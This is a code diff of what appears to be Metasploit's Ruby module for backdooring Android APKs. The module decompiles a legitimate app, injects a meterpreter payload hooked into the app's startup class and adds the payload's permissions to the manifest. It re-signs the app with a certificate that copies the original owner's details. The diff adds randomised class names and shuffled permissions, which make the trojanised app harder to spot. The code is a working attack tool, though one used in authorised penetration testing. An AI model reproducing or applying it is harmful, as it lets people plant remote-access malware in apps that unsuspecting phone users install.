@@ -1,6 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
 require 'rex/text'
 require 'tmpdir'
 require 'nokogiri'
@@ -28,16 +27,24 @@ class Msf::Payload::Apk
 
   def run_cmd(cmd)
     begin
-      stdin, stdout, stderr = Open3.popen3(cmd)
+      stdin, stdout, stderr = Open3.popen3(*cmd)
       return stdout.read + stderr.read
     rescue Errno::ENOENT
       return nil
     end
   end
 
-  # Find the activity that is opened when you click the app icon
-  def find_launcher_activity(amanifest)
+  # Find a suitable smali point to hook
+  def find_hook_point(amanifest)
     package = amanifest.xpath("//manifest").first['package']
+    application = amanifest.xpath('//application')
+    application_name = application.attribute("name")
+    if application_name
+      application_str = application_name.to_s
+      unless application_str == 'android.app.Application'
+        return application_str
+      end
+    end
     activities = amanifest.xpath("//activity|//activity-alias")
     for activity in activities
       activityname = activity.attribute("targetActivity")
@@ -68,7 +75,7 @@ class Msf::Payload::Apk
     }
   end
 
-  def fix_manifest(tempdir, package)
+  def fix_manifest(tempdir, package, main_service, main_broadcast_receiver)
     #Load payload's manifest
     payload_manifest = parse_manifest("#{tempdir}/payload/AndroidManifest.xml")
     payload_permissions = payload_manifest.xpath("//manifest/uses-permission")
@@ -78,6 +85,8 @@ class Msf::Payload::Apk
     original_permissions = original_manifest.xpath("//manifest/uses-permission")
 
     old_permissions = []
+    add_permissions = []
+
     original_permissions.each do |permission|
       name = permission.attribute("name").to_s
       old_permissions << name
@@ -87,21 +96,26 @@ class Msf::Payload::Apk
     payload_permissions.each do |permission|
       name = permission.attribute("name").to_s
       unless old_permissions.include?(name)
-        print_status("Adding #{name}")
-        if original_permissions.empty?
-          application.before(permission.to_xml)
-          original_permissions = original_manifest.xpath("//manifest/uses-permission")
-        else
-          original_permissions.before(permission.to_xml)
-        end
+        add_permissions += [permission.to_xml]
+      end
+    end
+    add_permissions.shuffle!
+    for permission_xml in add_permissions
+      print_status("Adding #{permission_xml}")
+      if original_permissions.empty?
+        application.before(permission_xml)
+        original_permissions = original_manifest.xpath("//manifest/uses-permission")
+      else
+        original_permissions.before(permission_xml)
       end
     end
 
     application = original_manifest.at_xpath('/manifest/application')
     receiver = payload_manifest.at_xpath('/manifest/application/receiver')
     service = payload_manifest.at_xpath('/manifest/application/service')
-    receiver.attributes["name"].value = package + receiver.attributes["name"].value
-    service.attributes["name"].value = package + service.attributes["name"].value
+    receiver.attributes["name"].value = package + '.' + main_broadcast_receiver
+    receiver.attributes["label"].value = main_broadcast_receiver
+    service.attributes["name"].value = package + '.' + main_service
     application << receiver.to_xml
     application << service.to_xml
 
@@ -110,7 +124,7 @@ class Msf::Payload::Apk
 
   def parse_orig_cert_data(orig_apkfile)
     orig_cert_data = Array[]
-    keytool_output = run_cmd("keytool -J-Duser.language=en -printcert -jarfile #{orig_apkfile}")
+    keytool_output = run_cmd(['keytool', '-J-Duser.language=en', '-printcert', '-jarfile', orig_apkfile])
     owner_line = keytool_output.match(/^Owner:.+/)[0]
     orig_cert_dname = owner_line.gsub(/^.*:/, '').strip
     orig_cert_data.push("#{orig_cert_dname}")
@@ -125,28 +139,13 @@ class Msf::Payload::Apk
     return orig_cert_data
   end
 
-  def backdoor_apk(apkfile, raw_payload)
-    unless apkfile && File.readable?(apkfile)
+  def backdoor_apk(apkfile, raw_payload, signature = true, manifest = true, apk_data = nil, service = true)
+    unless apk_data || apkfile && File.readable?(apkfile)
       usage
       raise RuntimeError, "Invalid template: #{apkfile}"
     end
 
-    keytool = run_cmd("keytool")
-    unless keytool != nil
-      raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
-    end
-
-    jarsigner = run_cmd("jarsigner")
-    unless jarsigner != nil
-      raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
-    end
-
-    zipalign = run_cmd("zipalign")
-    unless zipalign != nil
-      raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
-    end
-
-    apktool = run_cmd("apktool -version")
+    apktool = run_cmd(%w[apktool -version])
     unless apktool != nil
       raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
     end
@@ -158,51 +157,70 @@ class Msf::Payload::Apk
 
     #Create temporary directory where work will be done
     tempdir = Dir.mktmpdir
+    File.binwrite("#{tempdir}/payload.apk", raw_payload)
+    if apkfile
+      FileUtils.cp apkfile, "#{tempdir}/original.apk"
+    else
+      File.binwrite("#{tempdir}/original.apk", apk_data)
+    end
 
-    keystore = "#{tempdir}/signing.keystore"
-    storepass = "android"
-    keypass = "android"
-    keyalias = "signing.key"
-    orig_cert_data = parse_orig_cert_data(apkfile)
-    orig_cert_dname = orig_cert_data[0]
-    orig_cert_startdate = orig_cert_data[1]
-    orig_cert_validity = orig_cert_data[2]
+    if signature
+      keytool = run_cmd(['keytool'])
+      unless keytool != nil
+        raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
+      end
 
-    print_status "Creating signing key and keystore..\n"
-    run_cmd("keytool -genkey -v -keystore #{keystore} \
-    -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
-    -keysize 2048 -startdate '#{orig_cert_startdate}' \
-    -validity #{orig_cert_validity} -dname '#{orig_cert_dname}'")
+      jarsigner = run_cmd(['jarsigner'])
+      unless jarsigner != nil
+        raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
+      end
 
-    File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
-    FileUtils.cp apkfile, "#{tempdir}/original.apk"
+      zipalign = run_cmd(['zipalign'])
+      unless zipalign != nil
+        raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
+      end
+
+      keystore = "#{tempdir}/signing.keystore"
+      storepass = "android"
+      keypass = "android"
+      keyalias = "signing.key"
+      orig_cert_data = parse_orig_cert_data(apkfile)
+      orig_cert_dname = orig_cert_data[0]
+      orig_cert_startdate = orig_cert_data[1]
+      orig_cert_validity = orig_cert_data[2]
+
+      print_status "Creating signing key and keystore..\n"
+      run_cmd([
+        'keytool', '-genkey', '-v', '-keystore', keystore, '-alias', keyalias, '-storepass', storepass,
+        '-keypass', keypass, '-keyalg', 'RSA', '-keysize', '2048', '-startdate', orig_cert_startdate,
+        '-validity', orig_cert_validity, '-dname', orig_cert_dname
+      ])
+    end
 
     print_status "Decompiling original APK..\n"
-    run_cmd("apktool d #{tempdir}/original.apk -o #{tempdir}/original")
+    run_cmd(['apktool', 'd', "#{tempdir}/original.apk", '-o', "#{tempdir}/original"])
     print_status "Decompiling payload APK..\n"
-    run_cmd("apktool d #{tempdir}/payload.apk -o #{tempdir}/payload")
+    run_cmd(['apktool', 'd', "#{tempdir}/payload.apk", '-o', "#{tempdir}/payload"])
 
     amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
 
     print_status "Locating hook point..\n"
-    launcheractivity = find_launcher_activity(amanifest)
-    unless launcheractivity
-      raise RuntimeError, "Unable to find hookable activity in #{apkfile}\n"
-    end
-    smalifile = "#{tempdir}/original/smali*/" + launcheractivity.gsub(/\./, "/") + ".smali"
+    hookable_class = find_hook_point(amanifest)
+    smalifile = "#{tempdir}/original/smali*/" + hookable_class.gsub(/\./, "/") + ".smali"
     smalifiles = Dir.glob(smalifile)
     for smalifile in smalifiles
       if File.readable?(smalifile)
-        activitysmali = File.read(smalifile)
+        hooksmali = File.read(smalifile)
+        break
       end
     end
 
-    unless activitysmali
-      raise RuntimeError, "Unable to find hookable activity in #{smalifiles}\n"
+    unless hooksmali
+      raise RuntimeError, "Unable to find hook point in #{smalifile}\n"
     end
 
     entrypoint = 'return-void'
-    unless activitysmali.include? entrypoint
+    unless hooksmali.include? entrypoint
       raise RuntimeError, "Unable to find hookable function in #{smalifile}\n"
     end
 
@@ -211,7 +229,11 @@ class Msf::Payload::Apk
     FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")
 
     package = amanifest.xpath("//manifest").first['package']
-    package = package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
+    package = package.downcase + ".#{Rex::Text::rand_text_alpha_lower(5)}"
+    classes = {}
+    classes['Payload'] = Rex::Text::rand_text_alpha_lower(5).capitalize
+    classes['MainService'] = Rex::Text::rand_text_alpha_lower(5).capitalize
+    classes['MainBroadcastReceiver'] = Rex::Text::rand_text_alpha_lower(5).capitalize
     package_slash = package.gsub(/\./, "/")
     print_status "Adding payload as package #{package}\n"
     payload_files = Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")
@@ -221,34 +243,56 @@ class Msf::Payload::Apk
     # Copy over the payload files, fixing up the smali code
     payload_files.each do |file_name|
       smali = File.read(file_name)
-      newsmali = smali.gsub(/com\/metasploit\/stage/, package_slash)
-      newfilename = "#{payload_dir}#{File.basename file_name}"
-      File.open(newfilename, "wb") {|file| file.puts newsmali }
+      smali_class = File.basename file_name
+      for oldclass, newclass in classes
+        if smali_class == "#{oldclass}.smali"
+          smali_class = "#{newclass}.smali"
+        end
+        smali.gsub!(/com\/metasploit\/stage\/#{oldclass}/, package_slash + "/" + newclass)
+      end
+      smali.gsub!(/com\/metasploit\/stage/, package_slash)
+      newfilename = "#{payload_dir}#{smali_class}"
+      File.open(newfilename, "wb") {|file| file.puts smali }
     end
 
-    payloadhook = %Q^invoke-static {}, L#{package_slash}/MainService;->start()V
+    if service
+      hookfunction = "L#{package_slash}/#{classes['MainService']};->start()V"
+    else
+      hookfunction = "L#{package_slash}/#{classes['Payload']};->startContext()V"
+    end
 
+    payloadhook = %Q^invoke-static {}, #{hookfunction}
     ^ + entrypoint
-    hookedsmali = activitysmali.sub(entrypoint, payloadhook)
+    hookedsmali = hooksmali.sub(entrypoint, payloadhook)
 
     print_status "Loading #{smalifile} and injecting payload..\n"
     File.open(smalifile, "wb") {|file| file.puts hookedsmali }
 
     injected_apk = "#{tempdir}/output.apk"
     aligned_apk = "#{tempdir}/aligned.apk"
-    print_status "Poisoning the manifest with meterpreter permissions..\n"
-    fix_manifest(tempdir, package)
+    if manifest
+      print_status "Poisoning the manifest with meterpreter permissions..\n"
+      fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
+    end
 
-    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
-    run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
+    print_status "Rebuilding apk with meterpreter injection as #{injected_apk}\n"
+    apktool_output = run_cmd(['apktool', 'b', '-o', injected_apk, "#{tempdir}/original"])
     unless File.readable?(injected_apk)
+      print_error apktool_output
       raise RuntimeError, "Unable to rebuild apk with apktool"
     end
 
-    print_status "Signing #{injected_apk}\n"
-    run_cmd("jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore #{keystore} -storepass #{storepass} -keypass #{keypass} #{injected_apk} #{keyalias}")
-    print_status "Aligning #{injected_apk}\n"
-    run_cmd("zipalign 4 #{injected_apk} #{aligned_apk}")
+    if signature
+      print_status "Signing #{injected_apk}\n"
+      run_cmd([
+        'jarsigner', '-sigalg', 'SHA1withRSA', '-digestalg', 'SHA1', '-keystore', keystore,
+        '-storepass', storepass, '-keypass', keypass, injected_apk, keyalias
+      ])
+      print_status "Aligning #{injected_apk}\n"
+      run_cmd(['zipalign', '4', injected_apk, aligned_apk])
+    else
+      aligned_apk = injected_apk
+    end
 
     outputapk = File.read(aligned_apk)
 
